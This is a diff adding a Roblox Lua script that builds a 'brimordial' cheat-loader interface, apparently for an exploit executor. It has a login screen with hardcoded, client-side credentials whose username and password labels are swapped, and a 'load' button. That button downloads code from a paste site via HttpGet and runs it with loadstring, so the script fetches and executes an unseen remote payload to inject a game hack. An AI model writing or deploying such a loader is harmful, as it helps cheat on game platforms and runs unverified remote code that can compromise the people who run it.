@@ -1,0 +1,541 @@
+getgenv().newname = game:GetService("Players").LocalPlayer.Name
+
+
+local username = {    -- !!!PASSWORD!!!
+	"123",
+    "fadee"
+}
+local keys = {    -- !!!USERNAME!!!
+	"test",
+    "fade"
+}
+
+local LoginMainBG = Instance.new("Frame")
+local LoginSecondBG = Instance.new("Frame")
+local Name = Instance.new("TextLabel")
+local Logo = Instance.new("ImageLabel")
+local UsernameTextBox = Instance.new("TextBox")
+local PasswordTextBox = Instance.new("TextBox")
+local LoginButton = Instance.new("TextButton")
+local PersonIcon = Instance.new("ImageLabel")
+local LockIcon = Instance.new("ImageLabel")
+local LoginExitButton = Instance.new("TextButton")
+local ScreenGui = Instance.new("ScreenGui")
+local AnimationMainBG = Instance.new("Frame")
+local AnimationSpinningLogo = Instance.new("ImageLabel")
+
+local InjectMainBG = Instance.new("Frame")
+local InjectSecondBG = Instance.new("Frame")
+local InjectBGG2 = Instance.new("Frame")
+local InjectChooseBG = Instance.new("Frame")
+local InjectTranBG2 = Instance.new("Frame")
+local InjectLine = Instance.new("Frame")
+local InjectTranBG1 = Instance.new("Frame")
+local InjectLogo = Instance.new("ImageLabel")
+local InjectName = Instance.new("TextLabel")
+local InjectChooseCB = Instance.new("ImageLabel")
+local InjectChooseName = Instance.new("TextLabel")
+local InjectSubTime = Instance.new("TextLabel")
+local InjectLoadButton = Instance.new("TextButton")
+local InjectStatus = Instance.new("TextLabel")
+local InjectUpdated = Instance.new("TextLabel")
+local InjectCheatName2 = Instance.new("TextLabel")
+local InjectWelcome = Instance.new("TextLabel")
+local InjectExit = Instance.new("TextButton")
+
+local LoadingHack = Instance.new("TextLabel")
+local FinishedHack = Instance.new("TextLabel")
+
+
+-----------------INJECT SECTION-----------------
+AnimationMainBG.Visible = false
+AnimationSpinningLogo.Visible = false
+InjectMainBG.Visible = false
+InjectSecondBG.Visible = false
+InjectBGG2.Visible = false
+InjectChooseBG.Visible = false
+InjectTranBG2.Visible = false
+InjectLine.Visible = false
+InjectTranBG1.Visible = false
+InjectLogo.Visible = false
+InjectName.Visible = false
+InjectChooseCB.Visible = false
+InjectChooseName.Visible = false
+InjectSubTime.Visible = false
+InjectLoadButton.Visible = false
+InjectStatus.Visible = false
+InjectUpdated.Visible = false
+InjectCheatName2.Visible = false
+InjectWelcome.Visible = false
+InjectExit.Visible = false
+LoadingHack.Visible = false
+FinishedHack.Visible = false
+
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+InjectMainBG.Name = "InjectMainBG"
+InjectMainBG.Parent = ScreenGui
+InjectMainBG.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
+InjectMainBG.BorderColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
+InjectMainBG.Position = UDim2.new(0, 606, 0, 240)
+InjectMainBG.Size = UDim2.new(0, 324, 0, 244)
+
+InjectSecondBG.Name = "InjectSecondBG"
+InjectSecondBG.Parent = InjectMainBG
+InjectSecondBG.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+InjectSecondBG.BorderColor3 = Color3.new(0.0392157, 0.0392157, 0.0392157)
+InjectSecondBG.Position = UDim2.new(0, 16, 0, 15)
+InjectSecondBG.Size = UDim2.new(0, 290, 0, 211)
+
+InjectBGG2.Name = "InjectBGG2"
+InjectBGG2.Parent = InjectMainBG
+InjectBGG2.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
+InjectBGG2.BorderColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+InjectBGG2.Position = UDim2.new(0, 32, 0, 65)
+InjectBGG2.Size = UDim2.new(0, 114, 0, 147)
+
+InjectChooseBG.Name = "InjectChooseBG"
+InjectChooseBG.Parent = InjectMainBG
+InjectChooseBG.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+InjectChooseBG.BorderColor3 = Color3.new(0.113725, 0.113725, 0.113725)
+InjectChooseBG.Position = UDim2.new(0, 40, 0, 74)
+InjectChooseBG.Size = UDim2.new(0, 96, 0, 20)
+
+InjectTranBG2.Name = "InjectTranBG2"
+InjectTranBG2.Parent = InjectMainBG
+InjectTranBG2.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+InjectTranBG2.BorderColor3 = Color3.new(0.105882, 0.105882, 0.105882)
+InjectTranBG2.Position = UDim2.new(0, 169, 0, 138)
+InjectTranBG2.Size = UDim2.new(0, 117, 0, 73)
+
+InjectLine.Name = "InjectLine"
+InjectLine.Parent = InjectMainBG
+InjectLine.BackgroundColor3 = Color3.new(1, 0.72549, 1)
+InjectLine.BorderColor3 = Color3.new(1, 0.72549, 1)
+InjectLine.Position = UDim2.new(0, 169, 0, 148)
+InjectLine.Size = UDim2.new(0, 117, 0, 0)
+
+InjectTranBG1.Name = "InjectTranBG1"
+InjectTranBG1.Parent = InjectMainBG
+InjectTranBG1.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+InjectTranBG1.BorderColor3 = Color3.new(0.105882, 0.105882, 0.105882)
+InjectTranBG1.Position = UDim2.new(0, 169, 0, 65)
+InjectTranBG1.Size = UDim2.new(0, 117, 0, 61)
+
+InjectLogo.Name = "InjectLogo"
+InjectLogo.Parent = ScreenGui
+InjectLogo.BackgroundColor3 = Color3.new(1, 1, 1)
+InjectLogo.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+InjectLogo.Position = UDim2.new(0, 704, 0, 263)
+InjectLogo.Size = UDim2.new(0, 22, 0, 35)
+InjectLogo.Image = "rbxassetid://10429109680"
+
+InjectName.Name = "InjectName"
+InjectName.Parent = ScreenGui
+InjectName.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+InjectName.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+InjectName.Position = UDim2.new(0, 726, 0, 270)
+InjectName.Size = UDim2.new(0, 83, 0, 22)
+InjectName.Font = Enum.Font.SourceSans
+InjectName.Text = "brimordial"
+InjectName.TextColor3 = Color3.new(1, 0.72549, 1)
+InjectName.TextScaled = true
+InjectName.TextSize = 20
+InjectName.TextWrapped = true
+
+InjectChooseCB.Name = "InjectChooseCB"
+InjectChooseCB.Parent = ScreenGui
+InjectChooseCB.BackgroundColor3 = Color3.new(1, 1, 1)
+InjectChooseCB.Position = UDim2.new(0, 646, 0, 315)
+InjectChooseCB.Size = UDim2.new(0, 22, 0, 20)
+InjectChooseCB.Image = "rbxassetid://10430388478"
+
+InjectChooseName.Name = "InjectChooseName"
+InjectChooseName.Parent = ScreenGui
+InjectChooseName.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+InjectChooseName.BackgroundTransparency = 1
+InjectChooseName.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+InjectChooseName.Position = UDim2.new(0, 668, 0, 315)
+InjectChooseName.Size = UDim2.new(0, 23, 0, 11)
+InjectChooseName.Font = Enum.Font.SourceSans
+InjectChooseName.Text = "cbro"
+InjectChooseName.TextColor3 = Color3.new(1, 0.72549, 1)
+InjectChooseName.TextSize = 12
+InjectChooseName.TextWrapped = true
+
+InjectSubTime.Name = "InjectSubTime"
+InjectSubTime.Parent = ScreenGui
+InjectSubTime.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+InjectSubTime.BackgroundTransparency = 1
+InjectSubTime.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+InjectSubTime.Position = UDim2.new(0, 668, 0, 324)
+InjectSubTime.Size = UDim2.new(0, 36, 0, 11)
+InjectSubTime.Font = Enum.Font.SourceSans
+InjectSubTime.Text = "lifetime"
+InjectSubTime.TextColor3 = Color3.new(1, 1, 1)
+InjectSubTime.TextSize = 12
+InjectSubTime.TextWrapped = true
+
+InjectLoadButton.Name = "InjectLoadButton"
+InjectLoadButton.Parent = ScreenGui
+InjectLoadButton.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
+InjectLoadButton.BorderColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+InjectLoadButton.Position = UDim2.new(0, 781, 0, 425)
+InjectLoadButton.Size = UDim2.new(0, 105, 0, 19)
+InjectLoadButton.Font = Enum.Font.SourceSans
+InjectLoadButton.Text = "load"
+InjectLoadButton.TextColor3 = Color3.new(1, 1, 1)
+InjectLoadButton.TextSize = 14
+InjectLoadButton.MouseButton1Down:connect(function()
+	wait(0.5)
+    AnimationMainBG.Visible = true
+    AnimationSpinningLogo.Visible = true
+    LoadingHack.Visible = true
+    wait(3)
+    LoadingHack.Visible = false
+    FinishedHack.Visible = true
+    wait(1)
+    AnimationMainBG.Visible = false
+    AnimationSpinningLogo.Visible = false
+    InjectMainBG.Visible = false
+    InjectSecondBG.Visible = false
+    InjectBGG2.Visible = false
+    InjectChooseBG.Visible = false
+    InjectTranBG2.Visible = false
+    InjectLine.Visible = false
+    InjectTranBG1.Visible = false
+    InjectLogo.Visible = false
+    InjectName.Visible = false
+    InjectChooseCB.Visible = false
+    InjectChooseName.Visible = false
+    InjectSubTime.Visible = false
+    InjectLoadButton.Visible = false
+    InjectStatus.Visible = false
+    InjectUpdated.Visible = false
+    InjectCheatName2.Visible = false
+    InjectWelcome.Visible = false
+    InjectExit.Visible = false
+    FinishedHack.Visible = false
+	loadstring(game:HttpGet("https://snippet.host/xwxm/raw"))() -- script loadsting here
+end)
+
+InjectStatus.Name = "InjectStatus"
+InjectStatus.Parent = ScreenGui
+InjectStatus.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+InjectStatus.BackgroundTransparency = 1
+InjectStatus.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+InjectStatus.Position = UDim2.new(0, 775, 0, 409)
+InjectStatus.Size = UDim2.new(0, 74, 0, 13)
+InjectStatus.Font = Enum.Font.SourceSans
+InjectStatus.Text = "status: detected"
+InjectStatus.TextColor3 = Color3.new(1, 1, 1)
+InjectStatus.TextSize = 12
+InjectStatus.TextWrapped = true
+
+InjectUpdated.Name = "InjectUpdated"
+InjectUpdated.Parent = ScreenGui
+InjectUpdated.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+InjectUpdated.BackgroundTransparency = 1
+InjectUpdated.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+InjectUpdated.Position = UDim2.new(0, 768, 0, 396)
+InjectUpdated.Size = UDim2.new(0, 102, 0, 13)
+InjectUpdated.Font = Enum.Font.SourceSans
+InjectUpdated.Text = "last updated: 07/31"
+InjectUpdated.TextColor3 = Color3.new(1, 1, 1)
+InjectUpdated.TextSize = 12
+InjectUpdated.TextWrapped = true
+
+InjectCheatName2.Name = "InjectCheatName2"
+InjectCheatName2.Parent = ScreenGui
+InjectCheatName2.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+InjectCheatName2.BackgroundTransparency = 1
+InjectCheatName2.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+InjectCheatName2.Position = UDim2.new(0, 768, 0, 373)
+InjectCheatName2.Size = UDim2.new(0, 41, 0, 16)
+InjectCheatName2.Font = Enum.Font.SourceSans
+InjectCheatName2.Text = "csgo"
+InjectCheatName2.TextColor3 = Color3.new(1, 1, 1)
+InjectCheatName2.TextSize = 12
+InjectCheatName2.TextWrapped = true
+
+InjectWelcome.Name = "InjectWelcome"
+InjectWelcome.Parent = ScreenGui
+InjectWelcome.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+InjectWelcome.BackgroundTransparency = 1
+InjectWelcome.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+InjectWelcome.Position = UDim2.new(0, 774, 0, 311)
+InjectWelcome.Size = UDim2.new(0, 61, 0, 13)
+InjectWelcome.Font = Enum.Font.SourceSans
+InjectWelcome.Text = "welcome,  -"
+InjectWelcome.TextColor3 = Color3.new(1, 1, 1)
+InjectWelcome.TextSize = 12
+InjectWelcome.TextWrapped = true
+
+InjectExit.Name = "InjectExit"
+InjectExit.Parent = ScreenGui
+InjectExit.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+InjectExit.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+InjectExit.Position = UDim2.new(0, 886, 0, 262)
+InjectExit.Size = UDim2.new(0, 18, 0, 20)
+InjectExit.Font = Enum.Font.SourceSans
+InjectExit.Text = "X"
+InjectExit.TextColor3 = Color3.new(1, 1, 1)
+InjectExit.TextSize = 14
+InjectExit.MouseButton1Down:connect(function()
+	wait(0.5)
+    AnimationMainBG.Visible = false
+    AnimationSpinningLogo.Visible = false
+    InjectMainBG.Visible = false
+    InjectSecondBG.Visible = false
+    InjectBGG2.Visible = false
+    InjectChooseBG.Visible = false
+    InjectTranBG2.Visible = false
+    InjectLine.Visible = false
+    InjectTranBG1.Visible = false
+    InjectLogo.Visible = false
+    InjectName.Visible = false
+    InjectChooseCB.Visible = false
+    InjectChooseName.Visible = false
+    InjectSubTime.Visible = false
+    InjectLoadButton.Visible = false
+    InjectStatus.Visible = false
+    InjectUpdated.Visible = false
+    InjectCheatName2.Visible = false
+    InjectWelcome.Visible = false
+    InjectExit.Visible = false
+end)
+
+
+-----------------------LOGIN SECTION-----------------------
+
+
+LoginMainBG.Name = "LoginMainBG"
+LoginMainBG.Parent = ScreenGui
+LoginMainBG.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
+LoginMainBG.BorderColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
+LoginMainBG.Position = UDim2.new(0, 606, 0, 241)
+LoginMainBG.Size = UDim2.new(0, 324, 0, 244)
+
+LoginSecondBG.Name = "LoginSecondBG"
+LoginSecondBG.Parent = LoginMainBG
+LoginSecondBG.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+LoginSecondBG.BorderColor3 = Color3.new(0.0392157, 0.0392157, 0.0392157)
+LoginSecondBG.Position = UDim2.new(0, 16, 0, 16)
+LoginSecondBG.Size = UDim2.new(0, 290, 0, 211)
+
+Name.Name = "Name"
+Name.Parent = ScreenGui
+Name.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+Name.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+Name.Position = UDim2.new(0, 705, 0, 275)
+Name.Size = UDim2.new(0, 181, 0, 50)
+Name.Font = Enum.Font.SourceSans
+Name.Text = "brimordial"
+Name.TextColor3 = Color3.new(1, 0.72549, 0.882353)
+Name.TextScaled = true
+Name.TextSize = 20
+Name.TextWrapped = true
+
+Logo.Name = "Logo"
+Logo.Parent = ScreenGui
+Logo.BackgroundColor3 = Color3.new(1, 1, 1)
+Logo.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+Logo.Position = UDim2.new(0, 657, 0, 260)
+Logo.Size = UDim2.new(0, 47, 0, 83)
+Logo.Image = "rbxassetid://10429109680"
+
+UsernameTextBox.Name = "UsernameTextBox"
+UsernameTextBox.Parent = ScreenGui
+UsernameTextBox.BackgroundColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+UsernameTextBox.BorderColor3 = Color3.new(0.137255, 0.137255, 0.137255)
+UsernameTextBox.Position = UDim2.new(0, 705, 0, 377)
+UsernameTextBox.Size = UDim2.new(0, 143, 0, 22)
+UsernameTextBox.Font = Enum.Font.SourceSans
+UsernameTextBox.Text = "password"
+UsernameTextBox.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
+UsernameTextBox.TextSize = 14
+
+PasswordTextBox.Name = "PasswordTextBox"
+PasswordTextBox.Parent = ScreenGui
+PasswordTextBox.BackgroundColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+PasswordTextBox.BorderColor3 = Color3.new(0.137255, 0.137255, 0.137255)
+PasswordTextBox.Position = UDim2.new(0, 705, 0, 344)
+PasswordTextBox.Size = UDim2.new(0, 143, 0, 22)
+PasswordTextBox.Font = Enum.Font.SourceSans
+PasswordTextBox.Text = "username"
+PasswordTextBox.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
+PasswordTextBox.TextSize = 14
+
+LoginButton.Name = "LoginButton"
+LoginButton.Parent = ScreenGui
+LoginButton.BackgroundColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+LoginButton.BorderColor3 = Color3.new(0.137255, 0.137255, 0.137255)
+LoginButton.Position = UDim2.new(0, 723, 0, 426)
+LoginButton.Size = UDim2.new(0, 103, 0, 25)
+LoginButton.Font = Enum.Font.SourceSans
+LoginButton.Text = "login"
+LoginButton.TextColor3 = Color3.new(1, 1, 1)
+LoginButton.TextSize = 14
+LoginButton.MouseButton1Down:connect(function()
+local user = false
+local i = 1
+local j = 100
+while ( i < j ) do
+    if (UsernameTextBox.Text == username[i] and PasswordTextBox.Text == keys[i]) then 
+        i = 999999
+        user = true
+        wait(0.5)
+        LoginExitButton.Visible = false
+        LockIcon.Visible = false
+        PersonIcon.Visible = false
+        LoginButton.Visible = false
+        PasswordTextBox.Visible = false
+        UsernameTextBox.Visible = false
+        LoginButton.Visible = false
+        Logo.Visible = false
+        Name.Visible = false
+        LoginSecondBG.Visible = false
+        LoginMainBG.Visible = false
+    AnimationMainBG.Visible = true
+    AnimationSpinningLogo.Visible = true
+    wait(3)
+        AnimationMainBG.Visible = false
+        AnimationSpinningLogo.Visible = false
+        InjectMainBG.Visible = true
+        InjectSecondBG.Visible = true
+        InjectBGG2.Visible = true
+        InjectChooseBG.Visible = true
+        InjectTranBG2.Visible = true
+        InjectLine.Visible = true
+        InjectTranBG1.Visible = true
+        InjectLogo.Visible = true
+        InjectName.Visible = true
+        InjectChooseCB.Visible = true
+        InjectChooseName.Visible = true
+        InjectSubTime.Visible = true
+        InjectLoadButton.Visible = true
+        InjectStatus.Visible = true
+        InjectUpdated.Visible = true
+        InjectCheatName2.Visible = true
+        InjectWelcome.Visible = true
+        InjectExit.Visible = true
+    end
+    i = i + 1
+end
+if user == false then
+    game.Players.LocalPlayer:Kick("\n[brimordial]\nUnauthorized Access (If you belive this is false contact support.)")
+end
+end)
+
+PersonIcon.Name = "PersonIcon"
+PersonIcon.Parent = ScreenGui
+PersonIcon.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+PersonIcon.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+PersonIcon.Position = UDim2.new(0, 680, 0, 336)
+PersonIcon.Size = UDim2.new(0, 17, 0, 38)
+PersonIcon.Image = "rbxassetid://10429564250"
+
+LockIcon.Name = "LockIcon"
+LockIcon.Parent = ScreenGui
+LockIcon.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+LockIcon.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+LockIcon.Position = UDim2.new(0, 680, 0, 377)
+LockIcon.Size = UDim2.new(0, 16, 0, 22)
+LockIcon.Image = "rbxassetid://10429587351"
+
+LoginExitButton.Name = "LoginExitButton"
+LoginExitButton.Parent = ScreenGui
+LoginExitButton.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+LoginExitButton.BackgroundTransparency = 1
+LoginExitButton.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
+LoginExitButton.Position = UDim2.new(0, 880, 0, 258)
+LoginExitButton.Size = UDim2.new(0, 31, 0, 33)
+LoginExitButton.Font = Enum.Font.SourceSans
+LoginExitButton.Text = "X"
+LoginExitButton.TextColor3 = Color3.new(0.639216, 0.639216, 0.639216)
+LoginExitButton.TextSize = 14
+LoginExitButton.MouseButton1Down:connect(function()
+    LoginMainBG.Visible = false
+    LoginSecondBG.Visible = false
+    LoginButton.Visible = false
+    LoginExitButton.Visible = false
+    PasswordTextBox.Visible = false
+    UsernameTextBox.Visible = false
+    LockIcon.Visible = false
+    Logo.Visible = false
+    PersonIcon.Visible = false
+    Name.Visible = false
+end)
+
+--------ANIMATION SECTION 1----------
+
+
+AnimationMainBG.Name = "AnimationMainBG"
+AnimationMainBG.Parent = ScreenGui
+AnimationMainBG.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
+AnimationMainBG.BorderColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
+AnimationMainBG.Position = UDim2.new(0, 606, 0, 233)
+AnimationMainBG.Size = UDim2.new(0, 324, 0, 236)
+
+AnimationSpinningLogo.Name = "AnimationSpinningLogo"
+AnimationSpinningLogo.Parent = AnimationMainBG
+AnimationSpinningLogo.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
+AnimationSpinningLogo.BorderColor3 = Color3.new(0.0823529, 0.0823529, 0.0823529)
+AnimationSpinningLogo.Position = UDim2.new(0, 127, 0, 58)
+AnimationSpinningLogo.Size = UDim2.new(0, 75, 0, 100)
+AnimationSpinningLogo.Image = "rbxassetid://10430160888"
+
+LoadingHack.Name = "LoadingHack"
+LoadingHack.Parent = ScreenGui
+LoadingHack.BackgroundColor3 = Color3.new(1, 1, 1)
+LoadingHack.BackgroundTransparency = 1
+LoadingHack.Position = UDim2.new(0, 728, 0, 415)
+LoadingHack.Size = UDim2.new(0, 80, 0, 28)
+LoadingHack.Font = Enum.Font.SourceSans
+LoadingHack.Text = "loading hack"
+LoadingHack.TextColor3 = Color3.new(1, 1, 1)
+LoadingHack.TextScaled = true
+LoadingHack.TextSize = 14
+LoadingHack.TextWrapped = true
+
+FinishedHack.Name = "FinishedHack"
+FinishedHack.Parent = ScreenGui
+FinishedHack.BackgroundColor3 = Color3.new(1, 1, 1)
+FinishedHack.BackgroundTransparency = 1
+FinishedHack.Position = UDim2.new(0, 733, 0, 415)
+FinishedHack.Size = UDim2.new(0, 80, 0, 28)
+FinishedHack.Font = Enum.Font.SourceSans
+FinishedHack.Text = "finished"
+FinishedHack.TextColor3 = Color3.new(1, 1, 1)
+FinishedHack.TextSize = 14
+FinishedHack.TextWrapped = true
+
+local TweenService = game:GetService("TweenService")
+local Object = AnimationSpinningLogo -- The object you want to tween.
+
+local tweenInfo = TweenInfo.new(
+	3, -- The time the tween takes to complete
+	Enum.EasingStyle.Linear, -- The tween style.
+	Enum.EasingDirection.Out, -- EasingDirection
+	-1, -- How many times you want the tween to repeat. If you make it less than 0 it will repeat forever.
+	false, -- Reverse?
+	0 -- Delay
+)
+
+local Tween = TweenService:Create(Object, tweenInfo, {Rotation = 360}) -- Creates the tween with the TweenInfo and what properties you want to change
+Tween:Play() -- Plays the tween
+
+--scripties
+
+local function IPHCOC_fake_script() -- welcome.LocalScript 
+	local script = Instance.new('LocalScript', InjectWelcome)
+
+	local plr = game.Players.LocalPlayer
+
+	script.Parent.Text = "Hello, "..plr.Name.."."
+end
+coroutine.wrap(IPHCOC_fake_script)()
+
+
